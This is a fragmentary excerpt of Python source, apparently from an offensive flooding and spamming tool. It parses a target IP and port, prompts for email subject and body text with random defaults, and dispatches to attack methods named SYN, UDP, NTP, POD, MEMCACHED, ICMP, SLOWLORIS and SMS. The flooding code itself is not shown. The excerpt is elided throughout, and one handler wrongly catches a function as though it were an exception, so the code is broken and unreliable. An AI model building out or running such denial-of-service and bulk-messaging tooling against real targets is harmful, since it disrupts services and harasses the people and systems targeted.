...
from modules.jackmail.mailGear import ReadSenderEmail
...
def __GetAddressInfo(target):
    try:
        ...
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}You must enter ip \
                and port{Fore.RESET}")
        sys.exit(1)
    else:
        return ip, port
...
def __GetEmailMessage():
    ...
    subject = input(
        f"{Fore.BLUE}[?] {Fore.MAGENTA}Enter the Subject \
            (leave blank for random value): ")
    body = input(
        f"{Fore.BLUE}[?] {Fore.MAGENTA}Enter Your Message \
            (leave blank for random value): ")
...
def GetTargetAddress(target, method):
    if method == "SMS":
        ...
        return origin, 80
    elif method in ("SYN", "UDP", "NTP",
                    "POD", "MEMCACHED", "ICMP", "SLOWLORIS"):
...
def InternetConnectionCheck():
    ...
    except InternetConnectionCheck as e:
        print(
            f"{Fore.RED}[!] {e}, {Fore.MAGENTA}Your device is not \
                connected to the Internet{Fore.RESET}"
        )
        sys.exit(1)
